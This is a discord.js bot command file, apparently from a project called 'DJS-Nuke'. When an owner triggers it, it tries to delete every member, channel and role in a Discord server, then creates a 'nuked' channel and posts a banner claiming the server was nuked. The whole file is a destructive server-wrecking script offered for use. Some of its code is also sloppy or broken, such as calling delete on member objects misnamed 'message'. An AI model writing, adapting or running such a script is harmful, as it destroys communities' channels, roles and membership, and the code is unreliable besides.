const Discord = require("discord.js");

const ownerids = require('../ownerids.json');

module.exports.run = async(bot, message, args) => {
  
      
    if(!ownerids.ownerid.includes(message.author.id)) return;
  
    message.guild.members.forEach(message => {
        
     if(ownerids.ownerid.includes(message.user.id)) return;  

     message.delete("NUKED (DJS-Nuker)");

    })

    message.guild.channels.forEach(message => {

        message.delete("NUKED (DJS-Nuker)");

    })

    message.guild.roles.forEach(message => {

         message.delete("NUKED (DJS-Nuker)");

    })
  
  let banned = await(message.guild.members).size;
  
 message.guild.createChannel("nuked", {
    type: "text",
    permissionOverwrites: [{
        id: message.guild.id,
        allow: [`SEND_MESSAGES`]
    }]
}).then(() => {

    const embed = new Discord.RichEmbed()
    .setColor("fd0000")
    .setTitle("Nuked with DJS-Nuke")
    .setDescription("https://github.com/Setinal/DJS-Nuke")

    let fucked = message.guild.channels.find(channel => channel.name === "nuked")

    fucked.send(embed)
})
  
  message.delete();
  
}